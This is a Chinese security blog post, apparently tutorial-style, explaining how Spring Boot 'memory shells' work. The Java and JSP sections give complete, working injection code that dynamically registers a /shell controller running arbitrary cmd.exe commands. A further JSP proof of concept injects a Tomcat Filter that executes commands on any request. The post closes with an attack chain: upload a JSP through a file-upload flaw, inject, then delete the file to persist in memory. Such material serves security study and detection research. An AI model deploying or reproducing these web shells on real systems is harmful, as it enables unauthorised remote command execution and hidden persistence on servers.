---
title: 原理分析 | Controller —— SpringBoot 内存马
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/oUOAxEVDgLACtoxFfAn9AAAeEMFjjxIvTzPDsC~tplv-dy-vqe2-sr-v2_1920_1080_q80.jpg
categories:
  - 代码审计
  - 内存马
tags:
  - Java
  - Spring
  - 内存马
abbrlink: a3c7e2f1
date: 2026-04-27 18:54:00
---

# 原理分析 | Controller —— SpringBoot 内存马

## 目录

- [环境搭建](#环境搭建)
- [Spring MVC 基础](#spring-mvc-基础)
- [Spring Boot 完整请求流程](#spring-boot-完整请求流程)
- [内存马原理](#内存马原理)
- [前置知识](#前置知识)
- [Java Demo 实现](#java-demo-实现)
- [获取 handlerMapping 的两种姿势](#获取-handlermapping-的两种姿势)
- [JSP Payload 实现](#jsp-payload-实现)
- [验证](#验证)
- [补充：Spring Boot 下的 Tomcat Filter 内存马](#补充spring-boot-下的-tomcat-filter-内存马)
- [与 Tomcat 内存马对比](#与-tomcat-内存马对比)
- [总结](#总结)

---

## 环境搭建

搭建一下 Spring Boot 环境，更改为 `https://start.aliyun.com` 源，使用 Maven，Java 8。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426195534937.png)

选择 2.x 系列的版本，只用添加一个 Spring Web 依赖项。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426200217063.png)

## Spring MVC 基础

`com/example/demos/web/HelloController.java`

```java
package com.example.demos.web;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

// @RestController 等于 @Controller + @ResponseBody 的组合
// @Controller — 告诉 Spring 这个类是一个控制器，纳入容器管理
// @ResponseBody — 方法返回值直接写入 HTTP 响应体，不走视图解析（不跳页面）
// 加了 @RestController 之后，return "hello" 就是直接把字符串返回给浏览器，适合写 API 接口
@RestController
public class HelloController {

    // @GetMapping("/hello") 等于 @RequestMapping(value="/hello", method=RequestMethod.GET)，只处理 GET 请求
    // 访问 http://localhost:8080/hello 就会路由到这个方法
    @GetMapping("/hello")
    public String hello() {
        return "hello, spring!";
    }
}
```

直接运行 `SpringControllerApplication` 文件就能启动 Web 服务，不用再自己配置 Tomcat。Spring Boot 内嵌了 Tomcat，直接运行主类它自己就把 Tomcat 启动了，这也是 Spring Boot 和传统 Spring MVC 最大的区别之一——传统 Spring MVC 需要你自己装 Tomcat、打 war 包部署，Spring Boot 直接 `java -jar` 就能跑。

运行后可以看到：

```
Tomcat started on port(s): 8080 (http)
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426201733958.png)

浏览器访问 `http://localhost:8080/hello`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426201957745.png)

可以正常访问，没有问题。

**端口修改**

在 `resources/application.properties` 里加一行：

```properties
server.port=8888
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260426202205184.png)

另外 Windows 下 `.properties` 文件中文注释会乱码，可以在 IDEA 设置里修改：`Settings → Editor → File Encodings → Properties Files` 改成 UTF-8，勾选 Transparent native-to-ascii conversion。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427081620499.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427081704283.png)

---

和 Tomcat 对比一下会发现：

**Tomcat 原生 Servlet** 用 `@WebServlet("/path")` 一个注解搞定，因为 Servlet 本身就是处理请求的，注解直接声明路径就够了。

**Spring Controller** 拆成两个是因为职责分离：

- `@RestController` — 声明"这个类是个控制器"，让 Spring 容器认识它、管理它
- `@GetMapping` — 声明"这个方法处理什么路径、什么请求方式"

Spring 里一个 Controller 类可以有**很多个方法**，每个方法处理不同路径：

```java
@RestController
public class HelloController {

    @GetMapping("/hello")
    public String hello() { ... }

    @PostMapping("/login")
    public String login() { ... }

    // {id} 这种路径变量是 Spring MVC 特有的功能，叫路径参数
    @GetMapping("/user/{id}")
    public String getUser() { ... }
}
```

所以 `@RestController` 标在类上，`@GetMapping` 标在方法上，两层分开才灵活。Tomcat Servlet 是一个类对应一个路径，Spring Controller 是一个类可以对应多个路径，设计思路不一样。

**关于控制器类型**

Spring Boot 主要就两个：

|                   | 返回什么            | 用途             |
| ----------------- | ------------------- | ---------------- |
| `@Controller`     | 视图名（页面）      | 前后端不分离项目 |
| `@RestController` | 数据（字符串/JSON） | 前后端分离 API   |

`@Controller` 是传统控制器，方法返回值是视图名（页面），配合模板引擎（Thymeleaf、JSP）跳页面用：

```java
@Controller
public class PageController {
    @GetMapping("/index")
    public String index(Model model) {
        model.addAttribute("name", "张三");
        return "index"; // 跳转到 index.html 模板
    }
}
```

`@RestController` = `@Controller` + `@ResponseBody`，方法返回值直接写入响应体，写 API 接口用：

```java
@RestController
public class ApiController {
    @GetMapping("/user")
    public String user() {
        return "张三"; // 直接返回字符串/JSON
    }
}
```

现在基本都用 `@RestController`，前后端分离是主流，`@Controller` 只有老项目或者需要服务端渲染页面才用。

> 注意：如果两个 Controller 注册了同一个路径，Spring 启动时会直接报错：
>
> ```
> Caused by: java.lang.IllegalStateException: Ambiguous mapping. Cannot map 'xxxController' method
> ```
>
> Spring 不允许同一路径重复注册，启动就失败了。这个特性在打内存马时也要注意，注入前要确保路径没被占用。

更新一下 `HelloController`，再熟悉两个常用注解：

```java
package com.example.demos.web;

import org.springframework.web.bind.annotation.*;

@RestController
public class HelloController {

    // 1. 基础接口
    @GetMapping("/hello")
    public String hello() {
        return "hello, spring!";
    }

    // 2. 接收 URL 参数 ?name=xxx
    // @RequestParam — 取 URL 问号后面的参数，对应 Servlet 里的 request.getParameter("name")
    @GetMapping("/greet")
    public String greet(@RequestParam String name) {
        return "hello, " + name + "!";
    }

    // 3. 路径参数 /user/123
    // @PathVariable — 路径里用 {} 占位，方法参数用 @PathVariable 接收，Spring 自动解析
    @GetMapping("/user/{id}")
    public String getUser(@PathVariable String id) {
        return "用户id是：" + id;
    }
}
```

依次访问：

`http://localhost:8080/hello`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082600331.png)

`http://localhost:8080/greet?name=wr0ld`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082615838.png)

`http://localhost:8080/user/123`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427082630866.png)

---

## Spring Boot 完整请求流程

Spring Boot 在 Tomcat 那套基础上加了自己的一层，完整流程是：

```
请求进来
    ↓
Tomcat Connector（接收请求）
    ↓
Valve（Tomcat管道，如AccessLogValve）
    ↓
Listener（ServletContextListener等）
    ↓
Filter（过滤器链）
    ↓
DispatcherServlet（Spring MVC入口，本质是个Servlet）
    ↓
HandlerInterceptor（Spring拦截器）preHandle
    ↓
Controller（业务逻辑）
    ↓
HandlerInterceptor（postHandle）
    ↓
返回响应

```

对应关系：

| Tomcat 层 | Spring 层          |
| --------- | ------------------ |
| Valve     | —                  |
| Listener  | —                  |
| Filter    | —                  |
| Servlet   | DispatcherServlet  |
| —         | HandlerInterceptor |
| —         | Controller         |

简单说就是 `DispatcherServlet` 类似一个分发器，请求会经过 `HandlerInterceptor` 这个拦截器，最后到达 Controller 控制器来返回响应。Interceptor 其实过**两次**：

- **preHandle** — Controller 执行之前，可以在这里拦截请求，返回 false 就不往下走了
- **postHandle** — Controller 执行之后，可以在这里修改响应

所以 Spring Boot 的内存马比 Tomcat 多了两种：**Interceptor 内存马**和 **Controller 内存马**，加上继承的 Tomcat 那三种，一共五种：

```
Tomcat 内存马（3种）          Spring Boot 额外多的（2种）
    ├── Filter                    ├── Interceptor
    ├── Servlet                   └── Controller
    └── Listener

```

Interceptor 内存马注入的是 preHandle 阶段，请求一进来就执行命令，不需要特定路径，下篇再讲。这篇主要讲 Controller 内存马。

---

## 内存马原理

**正常 Spring 启动时的注册流程：**

```
Spring 启动
    ↓
扫描所有 @Controller 类
    ↓
读取 @RequestMapping 注解
    ↓
自动调用 registerMapping() 往路由表里注册

```

我们要做的就是**跳过前三步，直接执行第四步**——先写一个恶意类，然后动态注册到 Web 服务器。

**先理清两个容器（关键隔离）**

- **Spring 容器**（`ApplicationContext` / `DefaultListableBeanFactory`）：管理 Controller、Service、Component、Bean、SpringMVC 路由映射
- **Tomcat 容器**（`StandardContext`）：管理原生 Servlet、Filter、Listener、Jar 资源、Tomcat 级阀门、上下文生命周期

Spring Boot 是**双容器嵌套**，Spring 业务逻辑全部跑在 Spring 容器，仅 Web 底层通信依托 Tomcat，两者职责完全隔离。

**和 Tomcat Servlet 内存马对比：**

Tomcat Servlet 内存马：

```java
// 1. 创建恶意 Servlet 实例
EvilServlet evilServlet = new EvilServlet();
// 2. 往 StandardContext 里注册
StandardContext ctx = ...;
ctx.addServlet("evilServlet", evilServlet);
ctx.addServletMappingDecoded("/shell", "evilServlet");

```

Spring Controller 内存马做的事完全一样：

```java
// 1. 创建恶意 Controller 实例
EvilController evilController = new EvilController();
// 2. 往 HandlerMapping 里注册
handlerMapping.registerMapping(mappingInfo, evilController, method);

```

---

## 前置知识

**`handlerMapping` — 路由表**

记录了所有 URL 对应哪个 Controller，Spring 收到请求就来这里查：

```
/hello  → HelloController.hello()
/inject → InjectController.inject()
/shell  → EvilController.shell()   ← 我们注入进去的

```

类比 Tomcat：相当于 `StandardContext`，里面存了所有 Servlet 的映射关系。

**`mappingInfo` — 路由规则**

描述 `/shell` 这条路由长什么样：

```java
RequestMappingInfo mappingInfo = RequestMappingInfo
    .paths("/shell")                               // 地址：/shell
    .methods(RequestMethod.GET, RequestMethod.POST) // 支持：GET 和 POST
    .build();

```

类比 Tomcat：相当于 `addServletMappingDecoded("/shell", "evilServlet")` 里的路径参数。

**`method` — 具体方法（为什么要用反射）**

Tomcat Servlet 收到请求固定走 `service()` 方法，Spring 不知道你的恶意类里叫什么方法，所以要用反射告诉它：

```java
Method method = EvilController.class.getMethod(
    "shell",                    // 方法名
    HttpServletRequest.class,   // 第一个参数类型
    HttpServletResponse.class   // 第二个参数类型
);

```

拿到这个 `method` 对象之后，Spring 有请求进来时就执行：

```java
method.invoke(evilController, request, response);
// 等价于
evilController.shell(request, response);

```

所以 `handlerMapping.registerMapping(mappingInfo, evilController, method)` 就是新增一条 `/shell → EvilController.shell()` 的意思。

因为 Spring Boot 是一类多方法（多路径）的，所以需要指定这个注册的路径对应的是 `evilController` 里的哪个方法，这是和 Tomcat Servlet 最本质的区别。

**Spring MVC 参数自动注入机制**

`EvilController` 里的 `shell` 方法为什么需要 `request` 和 `response` 这两个参数？

`EvilController` 没有继承任何东西，参数不是"固定必须这样写"，而是因为我们需要这两个东西：一个用来取 URL 里的 `cmd` 参数，一个用来把命令执行结果写回浏览器。Spring MVC 有一套参数自动注入机制，只要方法参数是这些类型，Spring 都会自动填充：

| 参数类型                   | Spring 自动注入的内容 |
| -------------------------- | --------------------- |
| `HttpServletRequest`       | 当前请求对象          |
| `HttpServletResponse`      | 当前响应对象          |
| `HttpSession`              | 当前 Session          |
| `@RequestParam String xxx` | URL 参数              |
| `@PathVariable String xxx` | 路径参数              |

把参数去掉也能注册成功，只是拿不到 `request`，也就没办法取 `cmd` 参数执行命令了。

---

## Java Demo 实现

先写一段 Java 的 Demo 代码试试，再写偏向实战的 JSP 代码。

```java
package com.example.demos.web;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

@RestController
public class InjectController {

    // handlerMapping 就是那张记录所有 URL 对应哪个 Controller 的表
    // 通过 @Autowired 直接注入，不用自己去容器里手动找
    // JSP 不支持注解，需要通过 WebApplicationContext 手动找容器（后面讲）
    @Autowired
    private RequestMappingHandlerMapping handlerMapping;

    // 普通 Java 类，没有任何注解，不走 Spring 扫描流程，直接手动注册
    public class EvilController {
        // 方法签名需要 request 和 response：
        // request — 用来拿用户传进来的参数（cmd）
        // response — 用来把命令执行结果写回浏览器
        public void shell(HttpServletRequest request, HttpServletResponse response)
                throws Exception {
            // 取 URL 里 ?cmd=whoami 的值，和 Servlet 里的 request.getParameter() 一样
            String cmd = request.getParameter("cmd");
            // 防止 cmd 为空时执行空命令报错
            // != null — 有没有传 cmd 参数
            // !isEmpty() — 传了但不是空字符串
            if (cmd != null && !cmd.isEmpty()) {
                // ProcessBuilder — Java 执行系统命令的类
                //cmd.exe — Windows 的命令解释器，Linux 换成 bash
                // /c — 执行后面的命令然后退出，Linux 换成 -c
                //cmd — 用户传进来的命令，比如 whoami
                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                // 把错误输出合并到标准输出，命令执行报错也能在浏览器看到
                pb.redirectErrorStream(true);
                // JDK8 没有 readAllBytes()，用循环手动读，本质就是把命令执行结果从输出流读出来，写到 HTTP 响应里返回给浏览器。
                Process process = pb.start();// 启动进程
                java.io.InputStream is = process.getInputStream();// 拿到输出流
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();// 缓冲区
                byte[] buf = new byte[1024];// 每次读 1024 字节
                int len;
                while ((len = is.read(buf)) != -1){// 循环读直到没有数据
                    baos.write(buf, 0, len);// 写进缓冲区
                }
                response.getWriter().write(baos.toString());// 把结果写回浏览器
            }
        }
    }

    // 提供一个 /inject 接口，模拟实战中的漏洞点，访问它就触发注入流程
    @GetMapping("/inject")
    public String inject() throws Exception {

        // Step 1: 构造路由规则
        // BuilderConfiguration 是一个配置对象
        // setPatternParser 把当前路由表用的路径匹配引擎传进去，保证新注册的路由和已有路由用同一套匹配规则
        // Spring 5.3+ 之后路径匹配换了新引擎 PatternParser，不加这个 /shell 可能匹配不上
        RequestMappingInfo.BuilderConfiguration options =
                new RequestMappingInfo.BuilderConfiguration();
        options.setPatternParser(handlerMapping.getPatternParser());
        // 构造一张路由规则卡片：
        // paths("/shell") — 路径是 /shell
        // methods(GET, POST) — 支持 GET 和 POST
        // options(options) — 用刚才的匹配规则
        // build() — 构建完成
        RequestMappingInfo mappingInfo = RequestMappingInfo
                .paths("/shell")
                .methods(RequestMethod.GET, RequestMethod.POST)
                .options(options)
                .build();

        // Step 2: 注册进路由表
        EvilController evilController = new EvilController();
        // 反射拿到 shell 方法对象，参数是方法名和参数类型列表
        // 告诉 Spring 注册的是 shell 这个方法，参数是 request 和 response
        Method method = EvilController.class.getMethod(
                "shell",
                HttpServletRequest.class,
                HttpServletResponse.class
        );
        // 三合一注册进路由表：
        // mappingInfo — 什么路径触发（/shell，GET/POST）
        // evilController — 交给谁处理（EvilController 实例）
        // method — 调哪个方法（shell）
        handlerMapping.registerMapping(mappingInfo, evilController, method);

        return "注入成功！访问 /shell?cmd=whoami 验证";
    }
}

```

整个流程：

```
访问 /inject
    ↓
从路由表拿 PatternParser → 构造 /shell 路由规则
    ↓
实例化 EvilController，反射拿到 shell 方法
    ↓
registerMapping() 注册进路由表
    ↓
访问 /shell?cmd=whoami → shell() 执行命令 → 结果返回浏览器

```

访问 `http://localhost:8080/inject` 注册内存马：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115600751.png)

再次访问 `/inject` 会报错：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115802084.png)

这正是因为**同一路径不能重复注册**，第一次访问 `/inject` 时 `/shell` 注册成功，第二次再访问就冲突了。

访问 `http://localhost:8080/shell?cmd=whoami` 触发命令：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115711242.png)

重启 Spring Boot 后再次访问 `/shell` 会直接 404，证明这是内存马效果，重启就没了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427120103386.png)

> **补充：Spring Boot 默认不暴露详细错误信息**，只显示 `Whitelabel Error Page`。
>
> 想看具体报错有两种方式：
>
> - **方式一**：看 IDEA 控制台，报错的完整堆栈都在控制台里
> - **方式二**：在 `application.properties` 里加配置（测试用，生产环境绝对不能开）：
>
> ```properties
> server.error.include-message=always
> server.error.include-stacktrace=always
> 
> ```
>
> 这样浏览器也能看到具体报错，访问两次 `/inject` 就能看到详细的报错信息：
>
> ![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427120653346.png)
>
> 这也是渗透测试时遇到详细报错页面直接捡信息的原因。

---

## 获取 handlerMapping 的两种姿势

因为 `RequestMappingHandlerMapping` 是 Spring 管理的 Bean，所有 Bean 都存在 `WebApplicationContext`（Spring 容器）里，动态注册用的 `registerMapping()` 也是它的方法，所以第一步是拿到它。

类比 Filter 内存马：Filter 直接从 Tomcat 的 `StandardContext` 里取组件，Controller 内存马则是从 Spring 的 `WebApplicationContext` 里取组件，层级不同，思路一样。

**姿势一：`@Autowired` 直接注入（Java 代码专用）**

```java
@Autowired
private RequestMappingHandlerMapping handlerMapping;
// 直接拿到，不需要 WebApplicationContext

```

**姿势二：`WebApplicationContextUtils`（JSP/通用，推荐）**

```java
// 第一行：拿 Spring 容器
// request.getServletContext() — 从当前请求拿到 ServletContext，它是整个 Web 应用的全局对象，Tomcat 启动时就创建了
// WebApplicationContextUtils.getWebApplicationContext() — 工具类方法，从 ServletContext 里把 Spring 容器找出来
WebApplicationContext context = WebApplicationContextUtils
        .getWebApplicationContext(request.getServletContext());

// 第二行：从容器里取路由表
// context.getBean() — 从 Spring 容器里按类型取 Bean
RequestMappingHandlerMapping handlerMapping =
        context.getBean(RequestMappingHandlerMapping.class);

```

JSP 里没有 Spring 注解扫描，`@Autowired` 不生效，只能用姿势二手动取。

---

## JSP Payload 实现

实战中肯定不是直接跑 Java 代码，需要依赖 JSP 文件上传。JSP 里只能写普通 Java 代码，不支持注解扫描，原因是注解（`@RestController`、`@Autowired` 这些）需要 Spring 容器扫描才能生效，而 JSP 是运行时动态执行的，不走 Spring 的扫描流程。

**和 Java 版的区别：**

|          | Java 版               | JSP 版                            |
| -------- | --------------------- | --------------------------------- |
| 取路由表 | `@Autowired` 自动注入 | 手动从 `WebApplicationContext` 取 |
| 代码包裹 | 正常 Java 类          | `<%! %>` 声明类，`<% %>` 执行代码 |
| 导包     | `import` 语句         | `<%@ page import="" %>`           |

核心注册逻辑完全一样。

文件路径：`src/main/webapp/inject_jsp.jsp`

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.springframework.web.context.WebApplicationContext" %>
<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
<%@ page import="org.springframework.web.context.request.ServletRequestAttributes" %>
<%@ page import="org.springframework.web.servlet.mvc.method.RequestMappingInfo" %>
<%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
<%@ page import="org.springframework.web.bind.annotation.RequestMethod" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>

<%!
    // 恶意类，和 Java 版一样
    public class EvilController {
        public void shell(
                javax.servlet.http.HttpServletRequest request,
                javax.servlet.http.HttpServletResponse response
        ) throws Exception {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.isEmpty()) {
                ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
                pb.redirectErrorStream(true);
                Process process = pb.start();
                java.io.InputStream is = process.getInputStream();
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[1024];
                int len;
                while ((len = is.read(buf)) != -1) {
                    baos.write(buf, 0, len);
                }
                response.getWriter().write(baos.toString());
            }
        }
    }
%>

<%
    // Step 1: 手动取 WebApplicationContext（JSP 里不能用 @Autowired）
    WebApplicationContext context = WebApplicationContextUtils
            .getWebApplicationContext(request.getServletContext());

    // Step 2: 从容器里取路由表
    RequestMappingHandlerMapping handlerMapping =
            context.getBean(RequestMappingHandlerMapping.class);
    //这两个代替了原版java的@Autowired  原因就是 JSP 里没有 Spring 注解扫描，@Autowired 不生效，只能手动取。

    // Step 3: 构造路由规则
    RequestMappingInfo.BuilderConfiguration options =
            new RequestMappingInfo.BuilderConfiguration();
    options.setPatternParser(handlerMapping.getPatternParser());
    RequestMappingInfo mappingInfo = RequestMappingInfo
            .paths("/shell")
            .methods(RequestMethod.GET, RequestMethod.POST)
            .options(options)
            .build();

    // Step 4: 注册进路由表（把规则、类、类方法放入 handlerMapping 实现动态注册）
    EvilController evilController = new EvilController();
    Method method = EvilController.class.getMethod(
            "shell",
            javax.servlet.http.HttpServletRequest.class,
            javax.servlet.http.HttpServletResponse.class
    );
    handlerMapping.registerMapping(mappingInfo, evilController, method);

    response.getWriter().write("注入成功！访问 /shell?cmd=whoami 验证");
%>

```

如果直接访问 `http://localhost:8080/inject_jsp.jsp` 发现文件直接被下载了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427160148750.png)

这是因为 Spring Boot 默认不支持 JSP，需要在 `pom.xml` 加依赖（注意直接放 `<dependencies>` 里，不是放 `<dependencyManagement>`的  `<dependencies>`里）：

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-jasper</artifactId>
</dependency>

```

同时 JSP 文件要放在 `src/main/webapp/` 根目录下，不要放在 `WEB-INF/` 里（那个目录外部无法直接访问）。JSP 的路由机制和 Controller 不一样，路径就是文件在 `webapp/` 下的相对路径，文件名即路由，Tomcat 直接按文件路径映射，不需要任何控制器定义。

> 注意区分两个目录：
>
> - `src/main/resources/static/` — Spring Boot 静态资源目录，里面的文件原样返回，不解析，JSP 放这里会被直接下载
> - `src/main/webapp/` — Web 根目录，JSP 会被 Tomcat 解析执行

---

## 验证

访问 `http://localhost:8080/inject_jsp.jsp`（文件在 `webapp` 下，对应路由就是 `/inject_jsp.jsp`）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162535837.png)

访问 `http://localhost:8080/shell?cmd=whoami`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162753154.png)

换成 POST 方式也能请求成功（`request.getParameter()` GET 和 POST 都支持）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427162903670.png)

重启应用后内存马消失，因为注册信息只存在于 JVM 内存中。

---

## 补充：Spring Boot 下的 Tomcat Filter 内存马

Spring Boot 是基于 Tomcat 的，所以 Tomcat 的内存马也是支持的，但有些地方略有不同，以 Filter 为例，直接给 POC：

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>

<%
    // 1. 获取 StandardContext
    // 第一个不同点：不能直接强转 request，要先反射取 request 字段再 getContext()
    java.lang.reflect.Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    org.apache.catalina.connector.Request innerRequest =
            (org.apache.catalina.connector.Request) requestField.get(request);
    org.apache.catalina.core.StandardContext standardContext =
            (org.apache.catalina.core.StandardContext) innerRequest.getContext();

    // 2. 定义恶意 Filter
    Filter maliciousFilter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) {}

        @Override
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
                throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec(cmd);
                InputStream inputStream = process.getInputStream();
                ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = inputStream.read(buffer)) != -1) {
                    baos.write(buffer, 0, len);
                }
                response.getWriter().write(new String(baos.toByteArray()));
                return;
            }
            chain.doFilter(request, response);
        }

        @Override
        public void destroy() {}
    };

    // 3. 注册 FilterDef
    org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
    filterDef.setFilterName("evil");
    filterDef.setFilterClass(maliciousFilter.getClass().getName());
    filterDef.setFilter(maliciousFilter);
    standardContext.addFilterDef(filterDef);

    // 4. 注册 FilterMap（拦截所有请求）
    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
    filterMap.setFilterName("evil");
    filterMap.addURLPattern("/*");
    standardContext.addFilterMapBefore(filterMap);

    // 5. 强制写入 filterConfigs
    // 第二个不同点：filterConfigs 字段在父类里，getDeclaredField 直接找会报 NoSuchFieldException
    // 需要遍历父类查找
    Class<?> clazz = standardContext.getClass();
    Field filterConfigsField = null;
    while (clazz != null) {
        try {
            filterConfigsField = clazz.getDeclaredField("filterConfigs");
            break;
        } catch (NoSuchFieldException e) {
            clazz = clazz.getSuperclass();
        }
    }
    filterConfigsField.setAccessible(true);
    java.util.Map filterConfigs = (java.util.Map) filterConfigsField.get(standardContext);

    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class
            .getDeclaredConstructor(org.apache.catalina.Context.class,
                    org.apache.tomcat.util.descriptor.web.FilterDef.class);
    constructor.setAccessible(true);
    org.apache.catalina.core.ApplicationFilterConfig filterConfig =
            (org.apache.catalina.core.ApplicationFilterConfig)
            constructor.newInstance(standardContext, filterDef);

    filterConfigs.put("evil", filterConfig);

    response.getWriter().write("注入成功");
%>

```

基本上是之前写的 Filter 内存马照搬过来的，但有**两个不同点**：

**Spring Boot 内嵌 Tomcat 的坑：**

1. **获取 `StandardContext` 方式不同**：外置 Tomcat 可以直接强转 `request` 拿到，Spring Boot 里不行，要先反射取 `request` 字段，再调 `getContext()`
2. **`filterConfigs` 字段在父类里**：`getDeclaredField` 只找当前类不找父类，会直接报 `NoSuchFieldException`，需要遍历父类查找

这两点和外置 Tomcat 不一样，实战中遇到 Spring Boot 目标要注意，最好花时间先确认一下目标环境再开始。

访问 `http://localhost:8080/inject_filter.jsp` 注入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427174543351.png)

触发命令（Filter 拦截所有请求，任意路径带上 `cmd` 参数都能触发）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427174619061.png)

---

## 与 Tomcat 内存马对比

| 对比项   | Tomcat 内存马（Filter/Servlet） | Spring Controller 内存马         |
| -------- | ------------------------------- | -------------------------------- |
| 作用层   | Servlet 容器层                  | Spring MVC 框架层                |
| 注册方式 | 反射修改容器内部集合            | 官方公开 API `registerMapping()` |
| 适用条件 | 任意 Java Web 应用              | 需要 Spring MVC 环境             |
| 隐蔽性   | 较高                            | 中等（路由可被枚举）             |
| 检测难度 | 需扫描容器组件                  | 可通过 Actuator `/mappings` 暴露 |

值得注意的是，Spring 官方提供了 `registerMapping()` 这个公开 API，这意味着注册动作本身不会触发任何安全告警——从框架角度看这是"合法操作"。但也正因为如此，通过 Spring Actuator 的 `/actuator/mappings` 端点是可以枚举到动态注册的路由的，这是 Controller 内存马相比 Interceptor 内存马稍弱的一点。

---

## 总结

Spring Controller 内存马的核心就三步：

```
拿到路由表（RequestMappingHandlerMapping）
        ↓
构造路由规则（RequestMappingInfo）
        ↓
registerMapping() 注册（路由规则 + 恶意对象 + 方法）

```

实战攻击链：

```
文件上传漏洞 → 传恶意 JSP → 访问 JSP 触发注入 → 删除 JSP 文件 → 内马留在内存

```

下一篇写 Interceptor 内存马，注册方式需要反射修改私有字段，但因为不产生新路由，任意请求都能触发，隐蔽性更强。
